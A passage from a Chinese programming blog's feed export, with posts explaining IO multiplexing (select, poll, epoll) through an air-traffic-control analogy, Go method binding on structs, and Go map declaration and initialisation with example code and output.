title="IO多路复用"></a>IO多路复用</h2><p>IO多路复用是一种同步IO模型，实现一个线程可以监视多个文件句柄；</p><p>假设你是一个机场的空管， 你需要管理到你机场的所有的航线， 包括进港，出港， 有些航班需要放到停机坪等待，有些航班需要去登机口接乘客。<br>你会怎么做?<br>最简单的做法，就是你去招一大批空管员，然后每人盯一架飞机， 从进港，接客，排位，出港，航线监控，直至交接给下一个空港，全程监控。<br>那么问题就来了： </p><ul><li><p>很快你就发现空管塔里面聚集起来一大票的空管员，交通稍微繁忙一点，新的空管员就已经挤不进来了。 </p></li><li><p>空管员之间需要协调，屋子里面就1, 2个人的时候还好，几十号人以后 ，基本上就成菜市场了。</p></li><li><p>空管员经常需要更新一些公用的东西，比如起飞显示屏，比如下一个小时后的出港排期，最后你会很惊奇的发现，每个人的时间最后都花在了抢这些资源上。 </p></li></ul><p>现实上我们的空管同时管几十架飞机稀松平常的事情， 他们怎么做的呢？<br>他们用这个东西<br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/1.png"><br>这个东西叫flight progress strip. 每一个块代表一个航班，不同的槽代表不同的状态，然后一个空管员可以管理一组这样的块（一组航班），而他的工作，就是在航班信息有新的更新的时候，把对应的块放到不同的槽子里面。<br><em>这个东西现在还没有淘汰哦，只是变成电子的了而已。。</em><br>是不是觉得一下子效率高了很多，一个空管塔里可以调度的航线可以是前一种方法的几倍到几十倍。<br>如果你把每一个航线当成一个Sock(I/O 流), 空管当成你的服务端Sock管理代码的话.<br><strong>第一种方法就是最传统的多进程并发模型 (每进来一个新的I/O流会分配一个新的进程管理。)</strong><br><strong>第二种方法就是I/O</strong><a href="https://www.zhihu.com/search?q=%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:55772739%7D">多路复用</a>** (单个线程，通过记录跟踪每个I/O流(sock)的状态，来同时管理多个I/O流 。)**<br>_其实“I/O多路复用”这个坑爹翻译可能是这个概念在中文里面如此难理解的原因。所谓的I/O多路复用在英文中其实叫 I/O multiplexing. 如果你搜索multiplexing啥意思，基本上都会出这个图： </p><p>_<br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/2.png"><br>_于是大部分人都直接联想到”一根网线，多个sock复用” 这个概念，包括上面的几个回答， 其实不管你用多进程还是I/O多路复用， 网线都只有一根好伐。<strong>多个Sock复用一根网线这个功能是在内核＋驱动层实现的</strong>。 </p><p>_<br><strong>重要的事情再说一遍： I/O multiplexing 这里面的 multiplexing 指的其实是在单个线程通过记录跟踪每一个Sock(I/O流)的状态(对应空管塔里面的Fight progress strip槽)来同时管理多个I/O流</strong>. 发明它的原因，是尽量多的提高服务器的吞吐能力。<br>是不是听起来好拗口，看个图就懂了.<br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/3.png"><br>在同一个线程里面， 通过拨开关的方式，来同时传输多个I/O流， (学过EE的人现在可以站出来义正严辞说这个叫“<a href="https://www.zhihu.com/search?q=%E6%97%B6%E5%88%86%E5%A4%8D%E7%94%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:55772739%7D">时分复用</a>”了）。<br><em>什么，你还没有搞懂“一个请求到来了，nginx使用epoll接收请求的过程是怎样的”， 多看看这个图就了解了。提醒下，ngnix会有很多链接进来， epoll会把他们都监视起来，然后像拨开关一样，谁有数据就拨向谁，然后调用相应的代码处理。</em><br>了解这个基本的概念以后，其他的就很好解释了。<br>**select, poll, epoll 都是I/O多路复用的具体的实现，之所以有这三个鬼存在，其实是他们出现是有先后顺序的。 **</p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p><strong>select 是操作系统提供的系统调用函数，通过它，我们可以把一个文件描述符的数组发给操作系统， 让操作系统去遍历，确定哪个文件描述符可以读写， 然后告诉我们去处理。</strong></p><ol><li>select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制）</li><li>select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知）</li><li>select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）</li></ol><h3 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h3><p>poll 也是操作系统提供的系统调用函数。<br><strong>它和 select 的主要区别就是，去掉了 select 只能监听 1024 个文件描述符的限制。</strong></p><h3 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h3><p>epoll 是最终的大 boss，它解决了 select 和 poll 的一些问题。<br>还记得上面说的 select 的三个细节么？</p><ol><li> select 调用需要传入 fd 数组，需要拷贝一份到内核，高并发场景下这样的拷贝消耗的资源是惊人的。（可优化为不复制） </li><li> select 在内核层仍然是通过遍历的方式检查文件描述符的就绪状态，是个同步过程，只不过无系统调用切换上下文的开销。（内核层可优化为异步事件通知） </li><li> select 仅仅返回可读文件描述符的个数，具体哪个可读还是要用户自己遍历。（可优化为只返回给用户就绪的文件描述符，无需用户做无效的遍历）</li></ol><p>所以 epoll 主要就是针对这三点进行了改进。 </p><ol><li> 内核中保存一份文件描述符集合，无需用户每次都重新传入，只需告诉内核修改的部分即可。 </li><li> 内核不再通过轮询的方式找到就绪的文件描述符，而是通过异步 IO 事件唤醒。 </li><li> 内核仅会将有 IO 事件的文件描述符返回给用户，用户也无需遍历整个文件描述符集合。<br>具体，操作系统提供了这三个函数。 </li></ol><p>第一步，创建一个 epoll 句柄</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_create(<span class="keyword">int</span> size);</span><br></pre></td></tr></table></figure><p>第二步，向内核添加、修改或删除要监控的文件描述符。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_ctl(</span><br><span class="line">  <span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, <span class="keyword">struct</span> epoll_event *event);</span><br></pre></td></tr></table></figure><p>第三步，类似发起了 select() 调用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> epoll_wait(</span><br><span class="line">  <span class="keyword">int</span> epfd, <span class="keyword">struct</span> epoll_event *events, <span class="keyword">int</span> max events, <span class="keyword">int</span> timeout);</span><br></pre></td></tr></table></figure><p>过程展示：<br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/4.png"><br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/5.png"></p><p><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/6.png"><br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/7.png"><br><img src="http://106.12.125.218/medias/medias/linux%E4%B9%8Bio%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E4%B8%8Eepoll/8.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>一切的开始，都起源于这个 read 函数是操作系统提供的，而且是阻塞的，我们叫它 阻塞 IO。</strong><br><strong>为了破这个局，程序员在用户态通过多线程来防止主线程卡死。</strong><br><strong>非阻塞 IO，不能是通过我们用户层的小把戏，而是要恳请操作系统为我们提供一个非阻塞的 read 函数。</strong><br><strong>这个 read 函数的效果是，如果没有数据到达时（到达网卡并拷贝到了内核缓冲区），立刻返回一个错误值（-1），而不是阻塞地等待。</strong><br><strong>但多个文件描述符的读取就需要遍历，当高并发场景越来越多时，用户态遍历的文件描述符也越来越多，相当于在 while 循环里进行了越来越多的系统调用。</strong><br><strong>后来操作系统又发现这个场景需求量较大，于是又在操作系统层面提供了这样的遍历文件描述符的机制，这就是 IO 多路复用。</strong><br><strong>多路复用有三个函数，最开始是 select，然后又发明了 poll 解决了 select 文件描述符的限制，然后又发明了 epoll 解决 select 的三个不足。</strong></p><hr><p>所以，IO 模型的演进，其实就是时代的变化，倒逼着操作系统将更多的功能加到自己的内核而已。<br>如果你建立了这样的思维，很容易发现网上的一些错误。<br>比如好多文章说，多路复用之所以效率高，是因为用一个线程就可以监控多个文件描述符。<br>这显然是知其然而不知其所以然，多路复用产生的效果，完全可以由用户态去遍历文件描述符并调用其非阻塞的 read 函数实现。而多路复用快的原因在于，操作系统提供了这样的系统调用，使得原来的 while 循环里多次系统调用，变成了一次系统调用 + 内核层遍历这些文件描述符。<br>就好比我们平时写业务代码，把原来 while 循环里调 http 接口进行批量，改成了让对方提供一个批量添加的 http 接口，然后我们一次 rpc 请求就完成了批量添加。</p><blockquote><p>参考资料<br><a href="https://zhuanlan.zhihu.com/p/446607767">https://zhuanlan.zhihu.com/p/446607767</a><br><a href="https://www.zhihu.com/question/32163005/answer/55772739">https://www.zhihu.com/question/32163005/answer/55772739</a><br><a href="https://mp.weixin.qq.com/s/YdIdoZ_yusVWza1PU7lWaw">https://mp.weixin.qq.com/s/YdIdoZ_yusVWza1PU7lWaw</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go面向对象编程</title>
      <link href="/2022/05/07/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
      <url>/2022/05/07/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>一、go的面向对象，通过将方法与结构体变量进行绑定（当然方法也可以与其他数据类型进行绑定）。<br>func(t T)methodName(参数列表) (返回值列表){}</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span><span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(p.Name,<span class="string">&quot;say hello&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;<span class="string">&quot;Nomen&quot;</span>,<span class="number">18</span>&#125;</span><br><span class="line">p.Say()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为结构体是值拷贝类型，所以调用方法的时候将会复制一份结构体变量的数据。所以为了节约开销，绑定方法的方式可以通过结构体变量指针绑定<br>func(t *T)methodName(参数列表) (返回值列表) {}</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span><span class="title">Say</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Println(p.Name,<span class="string">&quot;say hello&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以指针方式绑定结构体或者直接类型绑定，访问属性值可以用（&amp;p）.Name ,go官方在底层其实已经实现了可以直接用p.Name 进行访问。但是要注意的是，指针绑定的对象是值引用，直接类型绑定的是值拷贝</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span>&#123;</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span><span class="title">test1</span><span class="params">()</span></span> &#123;</span><br><span class="line">p.Name = <span class="string">&quot;tom&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;test1&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span><span class="title">test2</span><span class="params">()</span></span> &#123;</span><br><span class="line">p.Name = <span class="string">&quot;jack&quot;</span></span><br><span class="line">fmt.Println(<span class="string">&quot;test2&quot;</span>,p.Name)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;<span class="string">&quot;Nomen&quot;</span>,<span class="number">18</span>&#125;</span><br><span class="line">(&amp;p).test1()</span><br><span class="line">p.test1()</span><br><span class="line">fmt.Println((&amp;p).Name,p.Name)</span><br><span class="line">(&amp;p).test2()</span><br><span class="line">p.test2()</span><br><span class="line">fmt.Println((&amp;p).Name,p.Name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/go%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/1.png"></p><p>由执行结果可以说明：test1()  直接绑定类型（值拷贝），方法内更改了name为tom，方法内输出为tom，而方法外用p.Name 依然是初始值Nome。 <strong>说明启用test1时，拷贝了一份Persen。操作的内存空间不同了</strong>。所以方法内和方法外的结果不同</p><p>test2() 绑定的是指针类型（值引用），方法内更改Name为jack，方法内输出为jack，方法外用p.Name已经将Nome更改为jack了。<strong>说明启用test2()时，引用了初始的Person</strong>。方法内部操作的内存空间还是同一份。所以方法内和方法外的结果是一样的。</p><p><strong>所以我们在实际项目中，大部分都会绑定指针类型。既节省了资源，又同步了对象的数据。</strong></p><p>二、方法的访问限定与方法名首字母是否大小写有关，与属性访问限定一样。首字母大写，包外可以访问，小写则只能在包内访问。</p><p>三、如果一个类型实现了String()方法，那么fmt.Println()进行打印的时候就会默认调用变量实现的这个String()方法。</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go语言map声明和初始化小结</title>
      <link href="/2022/05/06/Go%E8%AF%AD%E8%A8%80map%E5%A3%B0%E6%98%8E%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B0%8F%E7%BB%93/"/>
      <url>/2022/05/06/Go%E8%AF%AD%E8%A8%80map%E5%A3%B0%E6%98%8E%E5%92%8C%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>map的声明和初始化方法有两种, 直接初始化和使用make，如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m1 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line"><span class="keyword">var</span> m8 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第一部分-描述"><a href="#第一部分-描述" class="headerlink" title="第一部分 描述"></a>第一部分 描述</h2><p>这里重点对全局map变量和局部变量展开说明，分三种情况</p><p><strong>一、全局声明并初始化</strong><br>函数中可以直接使用map变量</p><p>以上输出结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">18268</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>] <span class="number">100</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">400</span>] <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">500</span>] <span class="number">0</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>说明：<br>0、Golang变量声明的时候不能省略类型，但是声明并赋值的时候可以省略类型，自动推导。map同样适用，所以以下两种写法等价</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>1、Golang和C一样，所有的运算都应该在函数内进行，函数外进行报语法错误。<br>1.0 函数体外初始化变量就两个办法，要么一次性全部赋值，要么先声明（全局/局部）变量，在某个函数内进行赋值，在函数体外进行结构体成员赋值相当于函数外面进行运算了<br>1.1 所以:=只能在函数中使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">m[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(m)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上错误代码，编译报错：syntax error: non-declaration statement outside function body<br><strong>二、全局声明、局部初始化</strong><br>局部必须初始化才能使用</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> m3 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> m4 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(m3)</span><br><span class="line">    <span class="comment">// 直接使用会出现panic</span></span><br><span class="line">    <span class="comment">// m3[3] = 300</span></span><br><span class="line">    <span class="comment">// 第一种方式初始化</span></span><br><span class="line">    m3 = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m3[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Println(m3)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 第二种方式初始化</span></span><br><span class="line">    m4 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    m4[<span class="number">4</span>] = <span class="number">400</span></span><br><span class="line">    fmt.Println(m4)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上输出结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">49253</span></span><br><span class="line"><span class="keyword">map</span>[]</span><br><span class="line"><span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line"><span class="keyword">map</span>[<span class="number">4</span>:<span class="number">400</span>]</span><br></pre></td></tr></table></figure><p><strong>三、局部声明和初始化</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 第一种方式[可以省略变量类型]</span></span><br><span class="line">    <span class="comment">// var m5 = map[int]int&#123;1: 100, 2: 200&#125;</span></span><br><span class="line">    <span class="keyword">var</span> m5 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span> = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m5[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m5 = %v\n&quot;</span>, m5)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 第二种方式</span></span><br><span class="line">    <span class="keyword">var</span> m6 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">    m6 = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    m6[<span class="number">3</span>] = <span class="number">300</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m6 = %v\n&quot;</span>, m6)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 第三种方式</span></span><br><span class="line">    <span class="keyword">var</span> m7 <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br><span class="line">    <span class="comment">// 必须要初始化</span></span><br><span class="line">    m7 = <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>)</span><br><span class="line">    m7[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m7 = %v\n&quot;</span>, m7)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 第四种方式</span></span><br><span class="line">    m8 := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;m8 = %v\n&quot;</span>, m8)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 第五种方式</span></span><br><span class="line">    m9 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>, <span class="number">10</span>)</span><br><span class="line">    m9[<span class="number">1</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;m9 = %v\n&quot;</span>, m9)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上输出结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">API server listening at: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">10546</span></span><br><span class="line">m5 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line">m6 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span> <span class="number">3</span>:<span class="number">300</span>]</span><br><span class="line">m7 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span>]</span><br><span class="line">m8 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span> <span class="number">2</span>:<span class="number">200</span>]</span><br><span class="line">m9 = <span class="keyword">map</span>[<span class="number">1</span>:<span class="number">100</span>]</span><br></pre></td></tr></table></figure><h2 id="第二部分-总结"><a href="#第二部分-总结" class="headerlink" title="第二部分 总结"></a>第二部分 总结</h2><p>新手写map常见错误<br>0、map value类型误加括号</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>][<span class="keyword">int</span>]</span><br></pre></td></tr></table></figure><p>编译提示：syntax error: unexpected newline, expecting type<br>正确写法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>1、初始化写错【<strong>新手特别容易出错</strong>】</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>VSCode提示: expected ‘;’, found ‘{‘ syntax<br>编译提示：syntax error: unexpected { after top level declaration<br>正确写法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 